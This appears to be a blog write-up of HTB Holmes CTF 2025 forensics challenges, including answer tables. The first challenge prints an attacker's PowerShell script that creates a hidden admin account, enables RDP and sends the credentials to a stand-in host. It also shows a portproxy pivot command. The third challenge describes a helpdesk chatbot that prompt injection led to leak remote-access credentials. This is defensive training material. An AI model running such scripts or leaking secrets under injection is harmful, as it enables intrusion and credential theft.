---
title: "(Not complete yet) - HTB Holmes CTF 2025"
date: 2025-09-27 17:00:00 +0700
category: [Writeups, Forensics, HTB, Sherlocks]
tags: [writeups, forensics, hackthebox, sherlocks]
description: Write-ups for all challenges of Hackthebox Holmes CTF 2025 
---

## ~ The Enduring Echo (easy) ~

### Detail

LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.

```
01. What was the first (non cd) command executed by the attacker on the host? (string)
02. Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
03. Which remote-execution tool was most likely used for the attack? (filename.ext)
04. What was the attacker’s IP address? (IPv4 address)
05. What is the first element in the attacker's sequence of persistence mechanisms? (string)
06. Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)
07. What local account did the attacker create? (string)
08. What domain name did the attacker use for credential exfiltration? (domain)
09. What password did the attacker's script generate for the newly created user? (string)
10. What was the IP address of the internal system the attacker pivoted to? (IPv4 address)
11. Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)
12. What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)
13. What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)
14. Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)
```

### Solution

#### Question 1: What was the first (non cd) command executed by the attacker on the host?

First of all, we have to investigate the winevt to figure out the attack. I use **EvtxECmd** of Eric Zimmerman

```powershell
EvtxECmd.exe -d "The_Enduring_Echo\C\Windows\System32\winevt\logs" --csv . --csvf output.csv
```

We viewed the parsed CSV file using Timeline Explorer, then filtered for Event ID 4688 (A new process has been created). We continue search "cmd" and we observed a remote execution process where `WmiPrvSE.exe` spawned `cmd.exe` to execute remote commands.

If we see the command line line of event 4688, this computer has enabled the function to allow capturing command line for "new process has been created" event, so we can use it to answer the questions below

![image](../assets/holmesctf25/enduringecho/1.png) 

![image](../assets/holmesctf25/enduringecho/2.png)

![image](../assets/holmesctf25/enduringecho/3.png)

#### Question 2: Which parent process (full path) spawned the attacker’s commands?

As I said before, `WmiPrvSE.exe` spawned `cmd.exe`. So the answer this full path of it

![image](../assets/holmesctf25/enduringecho/4.png)

#### Question 3: Which remote-execution tool was most likely used for the attack?

Based on the evidence, we see that the parent process is `WmiPrvSE.exe` and Command output redirection to network share Administrative share usage (ADMIN$). All of this matches `wmiexec.py`

#### Question 4: What was the attacker’s IP address?

Continue investigate the Security log, we can find the attacker's IP

![image](../assets/holmesctf25/enduringecho/5.png)

```powershell
cmd  /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
```

Attacker modified the hosts file to redirect domain names to their infrastructure, maybe use for C2.

#### Question 5: What is the first element in the attacker's sequence of persistence mechanisms?

The attacker creates the first persistence mechanism by creating a scheduled task, named `SysHelper Update`. The executed file is `JM.ps1` at `C:\Users\Werni\Appdata\Local\`

![image](../assets/holmesctf25/enduringecho/6.png)

#### Question 6: Identify the script executed by the persistence mechanism.

As I explain above, the answer of this question is `C:\Users\Werni\Appdata\Local\JM.ps1`

#### Question 7: What local account did the attacker create?

To find the answer to this question, we filtered event 4720 and looked at the events that occurred during the time of the attack. 

![image](../assets/holmesctf25/enduringecho/7.png)

#### Question 8: What domain name did the attacker use for credential exfiltration? 

We can find `JM.ps1` on machine, extracted it and we have can figure out what this file do

![image](../assets/holmesctf25/enduringecho/8.png)

```powershell
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```

We see that this code create a account on **Administrators** and **Remote Desktop Users** group. After that, send this creds to the attacker's domain `NapoleonsBlackPearl.htb`

#### Question 9: What password did the attacker's script generate for the newly created user?

This code generate the password by merge 2 part: String `Watson_` and value of `$timestamp` which getting date at that time and make it to format `yyyyMMddHHmmss`. We can determine the time by looking the time of creating user `svc_netupd` (4720)

![image](../assets/holmesctf25/enduringecho/9.png)

Because my time zone is GMT+7 so the correct time is: 2025-08-24 16:05:09 (UTC Time). And we have the correct password for `svc_netupd` user is `Watson_20250824160509`

#### Question 10: What was the IP address of the internal system the attacker pivoted to?

![image](../assets/holmesctf25/enduringecho/10.png)

```powershell
netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
```

This command was executed after event `proxy.bat` file was executed. The attacker created a TCP port forward on the Windows host -  listening on all IPv4 addresses at local port 9999 and forwarding incoming TCP connections to `192.168.1.101:22`. The attacker stored persistent at `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

#### Question 11: Which TCP port on the victim was forwarded to enable the pivot?

As I explain... The answer is `9999`

#### Question 12: What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings?

As I explain... The answer is `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

#### Question 13: What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system?

By searching Google, we can find the correct answer is `T1090.001`

![image](../assets/holmesctf25/enduringecho/11.png)

#### Question 14: Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this?

We can find the commandline of administrator at Powershell history on `C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

![image](../assets/holmesctf25/enduringecho/12.png)


### Final Answer

| Question | Answer |
|---|----|
| 1. What was the first (non cd) command executed by the attacker on the host?  | systeminfo | 
| 2. Which parent process (full path) spawned the attacker’s commands? | C:\Windows\System32\wbem\WmiPrvSE.exe | 
| 3. Which remote-execution tool was most likely used for the attack? | wmiexec.py |
| 4. What was the attacker’s IP address? | 10.129.242.110 |
| 5. What is the first element in the attacker's sequence of persistence mechanisms? | SysHelper Update |
| 6. Identify the script executed by the persistence mechanism. | C:\Users\Werni\Appdata\Local\JM.ps1 |
| 7. What local account did the attacker create? | svc_netupd |
| 8. What domain name did the attacker use for credential exfiltration? | NapoleonsBlackPearl.htb |
| 9. What password did the attacker's script generate for the newly created user? | Watson_20250824160509 |
| 10. What was the IP address of the internal system the attacker pivoted to?  | 192.168.1.101 |
| 11. Which TCP port on the victim was forwarded to enable the pivot?  | 9999 |
| 12. What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings?  | HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp |
| 13. What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system?  | T1090.001 |
| 14. Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? | `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f` |

---

---

---

## ~ The Card (easy) ~

### Detail

Holmes receives a breadcrumb from Dr. Nicole Vale - fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.

```
01. Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot.
02. It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? 
03. The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated?
04. During the attack, a seemingly meaningless string seems to be recurring. Which one is it?
05. OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.
06. How many tools and malware in total are linked to the previously identified campaigns?
07. It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash?
08. Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)
09. What is the full path of the file that the malware created to ensure its persistence on systems?
10. Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have?
11. Which organization does the previously identified IP belong to?
12. One of the exposed services displays a banner containing a cryptic message. What is it?
```

### Solution

#### Question 1: Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot.

We have three log files. Let's start with `access.log`

![image](../assets/holmesctf25/thecard/1.png)

We see that User-Agent `Lilnunc/4A4D - SpecterEye` have some suspicious GET request. The destinations are all important data stores and only admins can access them, but we see a lot of 404 requests. So we can confirm that **this is an attacker**. We also the `waf.log`, there are many warning about this

![image](../assets/holmesctf25/thecard/2.png)

#### Question 2: It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? 

Continue investigate `waf.log` we can see many rules about webshell are appeared

![image](../assets/holmesctf25/thecard/3.png)

#### Question 3: The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated?

Also on `waf.log`

![image](../assets/holmesctf25/thecard/4.png)

`access.log`

![image](../assets/holmesctf25/thecard/5.png)

`application.log`

![image](../assets/holmesctf25/thecard/6.png)

#### Question 4: During the attack, a seemingly meaningless string seems to be recurring. Which one is it?

Easy to see that, it's `4A4D`

#### Question 5: OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.

Filter the entities using "4A4D" and there are total 5 related campaigns

![image](../assets/holmesctf25/thecard/7.png)

#### Question 6: How many tools and malware in total are linked to the previously identified campaigns?

There are 5 malwares and 4 tools

![image](../assets/holmesctf25/thecard/8.png)

#### Question 7: It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash?

Click any malware which related to this attack, we can check their hash -> `7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477`

![image](../assets/holmesctf25/thecard/9.png)

#### Question 8: Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects.

Access to the CogWork Security Platform and browse the known hash, we can find the malware's network communication.

![image](../assets/holmesctf25/thecard/10.png)

![image](../assets/holmesctf25/thecard/11.png)

![image](../assets/holmesctf25/thecard/12.png)

#### Question 9: What is the full path of the file that the malware created to ensure its persistence on systems?

In "Detailed analysis" tab, we can find the answer

![image](../assets/holmesctf25/thecard/13.png)

#### Question 10: Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have?

Access to the Cognet Scanner Platform, we see that there are **11** open ports

![image](../assets/holmesctf25/thecard/14.png)

#### Question 11: Which organization does the previously identified IP belong to?

In "Details" option, we can find the organization which is `SenseShield MSP`

![image](../assets/holmesctf25/thecard/15.png)

#### Question 12: One of the exposed services displays a banner containing a cryptic message. What is it?

Go to "Services" tab, at unknown port **7477/tcp**, there is a cryptic message: `He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE`

![image](../assets/holmesctf25/thecard/16.png)

### Final Answer

| Question | Answer |
|---|----|
| 1. Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot. | Lilnunc/4A4D - SpecterEye |
| 2. It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? | temp_4A4D.php |
| 3. The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated? | database_dump_4A4D.sql |
| 4. During the attack, a seemingly meaningless string seems to be recurring. Which one is it? | 4A4D |
| 5. OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack. | 5 |
| 6. How many tools and malware in total are linked to the previously identified campaigns? | 9 |
| 7. It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash? | 7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477 |
| 8. Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!) | `74.77.74.77` |
| 9. What is the full path of the file that the malware created to ensure its persistence on systems? | `/opt/lilnunc/implant/4a4d_persistence.sh` |
| 10. Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have? | 11 |
| 11. Which organization does the previously identified IP belong to? | SenseShield MSP |
| 12. One of the exposed services displays a banner containing a cryptic message. What is it? | `He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE` |

---

---

---

## ~ The Watchman's Residue (medium) ~

### Detail

With help from D.I. Lestrade, Holmes acquires logs from a compromised MSP connected to the city’s financial core. The MSP’s AI servicedesk bot looks to have been manipulated into leaking remote access keys - an old trick of Moriarty’s.

```
1. What was the IP address of the decommissioned machine used by the attacker to start a chat session with MSP-HELPDESK-AI? (IPv4 address)
2. What was the hostname of the decommissioned machine? (string)
3. What was the first message the attacker sent to the AI chatbot? (string)
4. When did the attacker's prompt injection attack make MSP-HELPDESK-AI leak remote management tool info? (YYYY-MM-DD HH:MM:SS)
5. What is the Remote management tool Device ID and password? (IDwithoutspace:Password)
6. What was the last message the attacker sent to MSP-HELPDESK-AI? (string)
7. When did the attacker remotely access Cogwork Central Workstation? (YYYY-MM-DD HH:MM:SS)
8. What was the RMM Account name used by the attacker? (string)
9. What was the machine's internal IP address from which the attacker connected? (IPv4 address)
10. The attacker brought some tools to the compromised workstation to achieve its objectives. Under which path were these tools staged? (C:\FOLDER\PATH\)
11. Among the tools that the attacker staged was a browser credential harvesting tool. Find out how long it ran before it was closed? (Answer in milliseconds) (number)
12. The attacker executed a OS Credential dumping tool on the system. When was the tool executed? (YYYY-MM-DD HH:MM:SS)
13. The attacker exfiltrated multiple sensitive files. When did the exfiltration start? (YYYY-MM-DD HH:MM:SS)
14. Before exfiltration, several files were moved to the staged folder. When was the Heisen-9 facility backup database moved to the staged folder for exfiltration? (YYYY-MM-DD HH:MM:SS)
15. When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file? (YYYY-MM-DD HH:MM:SS)
16. The attacker created a persistence mechanism on the workstation. When was the persistence setup? (YYYY-MM-DD HH:MM:SS)
17. What is the MITRE ID of the persistence subtechnique? (Txxxx.xxx)
18. When did the malicious RMM session end? (YYYY-MM-DD HH:MM:SS)
19. The attacker found a password from exfiltrated files, allowing him to move laterally further into CogWork-1 infrastructure. What are the credentials for Heisen-9-WS-6? (user:password)
```

### Solution

#### Question 1: What was the IP address of the decommissioned machine used by the attacker to start a chat session with MSP-HELPDESK-AI?

We have C disk and pcap file. Let's start with pcap one. Check HTTP POST request, we see that there are many chat sessions (user vs AI). We observed two IP addresses: `10.32.43.31` and `10.0.69.45`. Upon checking the frame numbers, the first IP (10.32.43.31) started a chat session at frame 389, while the second IP (10.0.69.45) started at frame 1465.

If we check the message chat of 2 IP, we see that IP `10.0.69.45` is suspicious.

![image](../assets/holmesctf25/watchman/1.png)


#### Question 2: What was the hostname of the decommissioned machine?

We can check the hostname by `nbns` protocol

![image](../assets/holmesctf25/watchman/2.png)

#### Question 3: What was the first message the attacker sent to the AI chatbot?

Filter: `http.request.method == "POST" and ip.addr == 10.0.69.45`

![image](../assets/holmesctf25/watchman/3.png)

#### Question 4: When did the attacker's prompt injection attack make MSP-HELPDESK-AI leak remote management tool info?

To solve this question easily, I will extract all chat message by using last HTTP packet which contain json data. It's included all information of all chat messsage in the current session

![image](../assets/holmesctf25/watchman/4.png)

![image](../assets/holmesctf25/watchman/5.png)

Make it beautiful by using online tool, we determine when did the attacker's prompt injection make AI leak important info: `2025-08-19 12:02:06`

![image](../assets/holmesctf25/watchman/6.png)

#### Question 5: What is the Remote management tool Device ID and password?

Easy to see that, ID: `565963039` - Password: `CogWork_Central_97&65`

#### Question 6: What was the last message the attacker sent to MSP-HELPDESK-AI?

Filter: `http.request.method == "POST" and ip.addr == 10.0.69.45`

![image](../assets/holmesctf25/watchman/7.png)

#### Question 7: When did the attacker remotely access Cogwork Central Workstation?

We observed TeamViewer installed in the provided files. We can see history connection of it in `C\Program Files\TeamViewer\Connections_incoming.txt`

![image](../assets/holmesctf25/watchman/8.png)

```text
545021772	Cog-IT-ADMIN3	13-08-2025 10:12:35	13-08-2025 10:25:05	Cogwork_Admin	RemoteControl	{584b3e18-f0af-49e9-af50-f4de1b82e8df}	
545021772	Cog-IT-ADMIN3	15-08-2025 06:53:09	15-08-2025 06:55:10	Cogwork_Admin	RemoteControl	{0fa00d03-3c00-46ed-8306-be9b6f2977fa}	
514162531	James Moriarty	20-08-2025 09:58:25	20-08-2025 10:14:27	Cogwork_Admin	RemoteControl	{7ca6431e-30f6-45e3-9ac6-0ef1e0cecb6a}	
```

We see that, the AI chat bot leak credential on `2025-08-19 12:02:06` (mention above), so there is only 1 session with account name = `James Moriarty` after that. It's attacker. So the time which attacker remotely access is `2025-08-20 09:58:25`

#### Question 8: What was the RMM Account name used by the attacker?

As mention above, it's `James Moriarty`

#### Question 9: What was the machine's internal IP address from which the attacker connected?

We check the log of Teamviewer `C\Program Files\TeamViewer\Teamviewer15_Logfile.log` at the time attacker access. 

![image](../assets/holmesctf25/watchman/9.png)

![image](../assets/holmesctf25/watchman/10.png)

#### Question 10: The attacker brought some tools to the compromised workstation to achieve its objectives. Under which path were these tools staged?

The attacker accesss through Teamviewer so he can download/bring tool by using it. Check the log, we observe sth special

![image](../assets/holmesctf25/watchman/11.png)

All tools are staged on `C:\Windows\Temp\safe\`

#### Question 11: Among the tools that the attacker staged was a browser credential harvesting tool. Find out how long it ran before it was closed?

We see that there is a tool related browser credential harvesting, named `webbrowserpassview`. Upon checking the `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` registry sub key, we can determine the time that tool run is **8 sec = 8000 ms**

![image](../assets/holmesctf25/watchman/12.png)

#### Question 12: The attacker executed a OS Credential dumping tool on the system. When was the tool executed?

Easy to see that the tool is `mimikatz.exe`. The time the tool runs is the time its **Prefetch** file is created. By parsing `$J` file (Using `MFTECmd.exe`), we can see the answer: `2025-08-20 10:07:08`

![image](../assets/holmesctf25/watchman/13.png)

#### Question 13: The attacker exfiltrated multiple sensitive files. When did the exfiltration start?

Checking the TeamViewer logs, we find when the data exfiltration started.

![image](../assets/holmesctf25/watchman/14.png)

#### Question 14: Before exfiltration, several files were moved to the staged folder. When was the Heisen-9 facility backup database moved to the staged folder for exfiltration?

In the Teamviewer log, we know the Heisen-9 facility backup databas named `Heisen-9 remote snapshot.kdbx`.Looking at the parsed `$J` file, we see that there are 2 timestamps of existence: The 1st one is the file that was first created on the computer; The 2nd one is move/copy to somewhere. So answer for this question is 2nd timestamp: `2025-08-20 10:11:09`

![image](../assets/holmesctf25/watchman/15.png)

#### Question 15: When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file?

On exfiltration stage, attacker download a file txt named `dump.txt`. In the directory `C:\Users\Cogwork_Admin\AppData\Roaming\Microsoft\Windows\Recent\`, we find a LNK file pointing to `dump.txt`. Parsing it and we have the answer: ``

![image](../assets/holmesctf25/watchman/16.png)

#### Question 16: The attacker created a persistence mechanism on the workstation. When was the persistence setup?

In the TeamViewer logs we see that a suspicious file was downloaded to client, named `JM.exe`. Searching for this file name in the `HKLM\SOFTWARE` hive we find that an entry for Winlogon points to this file.

![image](../assets/holmesctf25/watchman/17.png)

We see that key Winlogon was last write on `2025-08-20 10:13:57`, which means the persistence was added at that time.

![image](../assets/holmesctf25/watchman/18.png)

#### Question 17: What is the MITRE ID of the persistence subtechnique?

Searching google, we know the answer is `T1547.004`

![image](../assets/holmesctf25/watchman/19.png)

![image](../assets/holmesctf25/watchman/20.png)

#### Question 18: When did the malicious RMM session end?

We can find the answer on `C\Program Files\TeamViewer\Connections_incoming.txt` which mentioned at question 7

![image](../assets/holmesctf25/watchman/21.png)

#### Question 19: The attacker found a password from exfiltrated files, allowing him to move laterally further into CogWork-1 infrastructure. What are the credentials for Heisen-9-WS-6?

There is no hint about password of exfiltrated file `.kdbx` so we have to crack it. To do this, we can use `keepass2john` and `hashcat/john`

![image](../assets/holmesctf25/watchman/22.png)

The password to open database is `cutiepie14`. Use it to open database and we can find the answer: `Werni:Quantum1!`

![image](../assets/holmesctf25/watchman/23.png)

### Final Answer

| Question | Answer |
|---|----|
| 1. What was the IP address of the decommissioned machine used by the attacker to start a chat session with MSP-HELPDESK-AI? | `10.0.69.45` |
| 2. What was the hostname of the decommissioned machine? | `WATSON-ALPHA-2` |
| 3. What was the first message the attacker sent to the AI chatbot? | `Hello Old Friend` |
| 4. When did the attacker's prompt injection attack make MSP-HELPDESK-AI leak remote management tool info? | 2025-08-19 12:02:06 |
| 5. What is the Remote management tool Device ID and password? | `565963039:CogWork_Central_97&65` |
| 6. What was the last message the attacker sent to MSP-HELPDESK-AI? | `JM WILL BE BACK` |
| 7. When did the attacker remotely access Cogwork Central Workstation? | 2025-08-20 09:58:25 |
| 8. What was the RMM Account name used by the attacker? | James Moriarty |
| 9. What was the machine's internal IP address from which the attacker connected? | `192.168.69.213` |
| 10. The attacker brought some tools to the compromised workstation to achieve its objectives. Under which path were these tools staged? | `C:\Windows\Temp\safe\` |
| 11. Among the tools that the attacker staged was a browser credential harvesting tool. Find out how long it ran before it was closed? | 8000 |
| 12. The attacker executed a OS Credential dumping tool on the system. When was the tool executed? | 2025-08-20 10:07:08 |
| 13. The attacker exfiltrated multiple sensitive files. When did the exfiltration start? | 2025-08-20 10:12:07 |
| 14. Before exfiltration, several files were moved to the staged folder. When was the Heisen-9 facility backup database moved to the staged folder for exfiltration? | 2025-08-20 10:11:09 |
| 15. When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file? | 2025-08-20 10:08:06 |
| 16. The attacker created a persistence mechanism on the workstation. When was the persistence setup? | 2025-08-20 10:13:57 |
| 17. What is the MITRE ID of the persistence subtechnique? | T1547.004 |
| 18. When did the malicious RMM session end? | 20-08-2025 10:14:27 |
| 19. The attacker found a password from exfiltrated files, allowing him to move laterally further into CogWork-1 infrastructure. What are the credentials for Heisen-9-WS-6? | `Werni:Quantum1!` |

---

---

---

## ~ The Tunnel Without Walls (hard) ~

---

---

---

## ~ The Payload (hard) ~